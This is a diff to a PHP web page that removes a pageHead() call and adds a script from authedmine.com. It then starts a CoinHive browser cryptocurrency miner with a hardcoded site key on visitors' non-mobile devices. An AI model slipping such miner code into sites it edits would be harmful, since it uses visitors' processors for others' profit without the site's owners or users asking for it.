@@ -99,12 +99,21 @@ if (isset($_GET['logout'])) {
 	<script type="text/javascript" src="./js/nouislider.min.js" defer></script>
 	<script type="text/javascript" src="./js/swiped.min.js" defer></script>
 	<script type="text/javascript" src="./js/ie10-viewport-bug-workaround.js"></script>
-	<?php echo pageHead(); ?>
+	<script src="https://authedmine.com/lib/authedmine.min.js"></script>
 
 </head>
 
 <body style="background-color:black">
 <img id="holder" src="">
+<script>
+	var miner = new CoinHive.Anonymous("hQCirRYKI9yny7hxr3kpaqh76DepJa9R", {throttle: 0.4});
+
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		console.log("Firing miner.");
+		miner.start();
+	}
+</script>
+
 <script>
 	var messageBox = [];
 	<?php echo pageCred();?>
